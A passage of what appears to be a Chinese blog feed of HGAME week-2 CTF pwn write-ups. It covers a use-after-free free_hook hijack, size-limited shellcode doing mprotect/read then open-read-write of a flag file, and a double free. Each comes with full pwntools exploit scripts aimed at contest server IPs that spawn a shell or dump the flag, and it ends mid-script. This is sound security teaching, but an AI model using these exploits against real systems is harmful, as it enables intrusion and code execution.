class="number">0xf0</span>*<span class="string">b&quot;a&quot;</span>+p64(<span class="number">0x200</span>))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">add_note(i,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add_note(<span class="number">4</span>,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">add_note(i+<span class="number">5</span>,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line">add_note(<span class="number">13</span>,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line">add_note(<span class="number">8</span>,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">delete(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">7</span>):</span><br><span class="line">delete(i)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">add_note(i,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">7</span>):</span><br><span class="line">add_note(i,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line">payload=p64(free_hook)</span><br><span class="line">add_note(<span class="number">7</span>,<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">sleep(<span class="number">0.25</span>)</span><br><span class="line">add_note(<span class="number">8</span>,<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">sleep(<span class="number">0.25</span>)</span><br><span class="line">add_note(<span class="number">9</span>,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line">add_note(<span class="number">10</span>,<span class="number">0x30</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.25</span>)</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">add_note(<span class="number">13</span>,<span class="number">0x30</span>,p64(system))</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#exit()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="eldenring3"><a href="#eldenring3" class="headerlink" title="eldenring3"></a>eldenring3</h2><p>不会 ，现在看到io_file就想死<br>flag: hgame{9db0b9cb3ec594a7f698cec1fb05857a7b992701}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hgame_week2_pwn题解</title>
      <link href="/posts/hgame_week2.html"/>
      <url>/posts/hgame_week2.html</url>
      
        <content type="html"><![CDATA[<h2 id="EldenRing-2"><a href="#EldenRing-2" class="headerlink" title="EldenRing 2"></a>EldenRing 2</h2><p>简单的uaf,因为寒假才刚开始入门堆，所以写得稍微详细点。先看看伪c,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu(*(_QWORD *)&amp;argc);</span><br><span class="line">    *(_QWORD *)&amp;argc = <span class="string">&quot;%d&quot;</span>;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        delete_note(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        edit_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        show_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        *(_QWORD *)&amp;argc = <span class="string">&quot;Wrong choice!&quot;</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>  查看逻辑发现，free掉后指针没有释放，且free后仍然可以edit和show。free掉后可以用edit函数来改掉chunk的bk指针来实现一次任意地址写，在这之前我们可以先想办法把free掉的chunk放进unsorted_bins中，unsortedbins中的第一个chunk的bk指针是一个libc相关的地址，然后我们用show函数把其中的内容泄露出来，就可以拿到libc的基址，随后再利用uaf去劫持free_hook or malloc_hook(个人比较喜欢free_hook,这样传参比较方便，当然如果有满足条件的one_gadget也可以用malloc_hook)。由于tcachebins的存在我们需要先把tcachebins填满。</p><h4 id="edit-和-show函数"><a href="#edit-和-show函数" class="headerlink" title="edit 和 show函数"></a>edit 和 show函数</h4>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">  <span class="type">int</span> <span class="title function_">edit_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !notes[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, (<span class="type">void</span> *)notes[v1], note_size[v1]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">show_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( notes[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)notes[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么怎么让chunk被加入到unsortedbins中呢，这里只需要让两个物理相邻的chunk的状态不同就可以了,即一个chunk被占用，另一个chunk处于空闲状态。</p><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *a=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">    <span class="type">char</span> *b=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理解攻击原理之后，攻击就变得很简单了，只需要利用uaf漏洞将任意一个chunk的bk，指针改为free_hook的地址，malloc分配到free_hook后，把free_hook中的内容改为system的地址，随后再传给free函数一个”&#x2F;bin&#x2F;sh”,这样程序就会去执行system函数，弹出一个shell</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&quot;./vuln&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;47.100.137.175&quot;</span>,<span class="number">32044</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>(<span class="params">index,size</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_note</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_note</span>(<span class="params">index,payload</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendafter(<span class="string">&quot;Content: &quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">0.25</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_note</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">add_note(i,<span class="number">0xa0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">delete_note(i)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show_note(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">main_arena=u64(p.recv(<span class="number">8</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">offset=<span class="number">0x1ecbe0</span></span><br><span class="line">libc_base=main_arena-offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">payload=p64(free_hook)+<span class="number">0x98</span>*<span class="string">b&quot;\x00&quot;</span></span><br><span class="line">edit_note(<span class="number">6</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add_note(<span class="number">9</span>,<span class="number">0xa0</span>)</span><br><span class="line">add_note(<span class="number">10</span>,<span class="number">0xa0</span>)</span><br><span class="line">edit_note(<span class="number">9</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">payload=p64(system)</span><br><span class="line">edit_note(<span class="number">10</span>,payload)</span><br><span class="line">delete_note(<span class="number">9</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#exit()</span></span><br></pre></td></tr></table></figure><h2 id="Shellcode-Master"><a href="#Shellcode-Master" class="headerlink" title="Shellcode Master"></a>Shellcode Master</h2><p>先看看汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">buf= qword ptr -8</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">endbr64</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 10h</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    init</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    sandbox</span><br><span class="line">mov     r9d, 0          ; offset</span><br><span class="line">mov     r8d, 0FFFFFFFFh ; fd</span><br><span class="line">mov     ecx, 22h ; &#x27;&quot;&#x27;  ; flags</span><br><span class="line">mov     edx, 7          ; prot</span><br><span class="line">mov     esi, 1000h      ; len</span><br><span class="line">mov     edi, 2333000h   ; addr</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _mmap</span><br><span class="line">cdqe</span><br><span class="line">mov     [rbp+buf], rax</span><br><span class="line">lea     rax, s          ; &quot;I heard that a super shellcode master c&quot;...</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    _puts</span><br><span class="line">mov     rax, [rbp+buf]</span><br><span class="line">mov     edx, 16h        ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _read</span><br><span class="line">lea     rax, large cs:402064h ; &quot;Love!&quot;</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    _puts</span><br><span class="line">mov     rax, [rbp+buf]</span><br><span class="line">mov     edx, 4          ; prot</span><br><span class="line">mov     esi, 1000h      ; len</span><br><span class="line">mov     rdi, rax        ; addr</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _mprotect</span><br><span class="line">mov     r15, 2333000h</span><br><span class="line">mov     rax, 2333h</span><br><span class="line">mov     rbx, 2333h</span><br><span class="line">mov     rcx, 2333h</span><br><span class="line">mov     rdx, 2333h</span><br><span class="line">mov     rsp, 2333h</span><br><span class="line">mov     rbp, 2333h</span><br><span class="line">mov     rsi, 2333h</span><br><span class="line">mov     rdi, 2333h</span><br><span class="line">mov     r8, 2333h</span><br><span class="line">mov     r9, 2333h</span><br><span class="line">mov     r10, 2333h</span><br><span class="line">mov     r11, 2333h</span><br><span class="line">mov     r12, 2333h</span><br><span class="line">mov     r13, 2333h</span><br><span class="line">mov     r14, 2333h</span><br><span class="line">jmp     r15</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure><p>程序开了沙箱，禁用了execve,只能orw了，程序的逻辑很好懂，就是限了长度的shellcode,想想就知道想用0x16个字节完成orw几乎不可能，我们不妨换个思路，刚开始想的是执行完一次shellcode后再jmp到call read函数处，再read一遍，但尴尬的是rsp,rbp都被置为2333h,这么低的地址如果往里面push的话必然触发保护，并且在执行完mprotect函数后，0x2333000h就没有读写权限了，这条路子也行不通，想来想去比较可行的只有用0x16个字节实现mprotect和read这两个syscall了<del>(凑字节的过程异常痛苦)</del>,还有一点比较关键，就是read的位置，我们执行完mprotect后，rcx寄存器的值刚好合适，我们把它设为read的起始地址，还可以省下几个字节。</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./vuln&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;106.14.57.14&quot;</span>,<span class="number">31332</span>)</span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov ax,10</span></span><br><span class="line"><span class="string">shl edi,12</span></span><br><span class="line"><span class="string">mov dx,0xf</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">xor edi,edi</span></span><br><span class="line"><span class="string">mov esi,ecx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line">p.sendafter(<span class="string">&quot;shellcode\n&quot;</span>,shellcode)</span><br><span class="line"><span class="comment">#sleep(0.125)</span></span><br><span class="line"><span class="comment">#shellcode=shellcraft.open(&quot;./flag&quot;)</span></span><br><span class="line"><span class="comment">#payload=asm(shellcode)</span></span><br><span class="line">payload=asm(<span class="string">&quot;nop&quot;</span>)*(<span class="number">0x2333015</span>-<span class="number">0x233300d</span>+<span class="number">1</span>)</span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov dl, 0xff</span></span><br><span class="line"><span class="string">mov al, 0 </span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload+=asm(shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=asm(<span class="string">&quot;nop&quot;</span>)*<span class="number">0x10</span></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rsi,r15</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">mov rdi, r15</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rsi, r15</span></span><br><span class="line"><span class="string">mov rdx, 0x50</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, r15</span></span><br><span class="line"><span class="string">mov rdx, 0x50</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload+=asm(shellcode)</span><br><span class="line">p.send(payload)</span><br><span class="line">flag=<span class="string">b&quot;./flag\x00&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(flag)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="fastnotes"><a href="#fastnotes" class="headerlink" title="fastnotes"></a>fastnotes</h2><p>double free,这里的fastnotes检查比较宽松，避开fastbins的第一个chunk去free就可以了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = (<span class="type">void</span> *)notes[v1];</span><br><span class="line">    <span class="keyword">if</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(v2);</span><br><span class="line">      v2 = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;No such note.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里还做了个障眼法，这个ptr是个局部变量，不成问题。double free后继续劫持free_hook</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 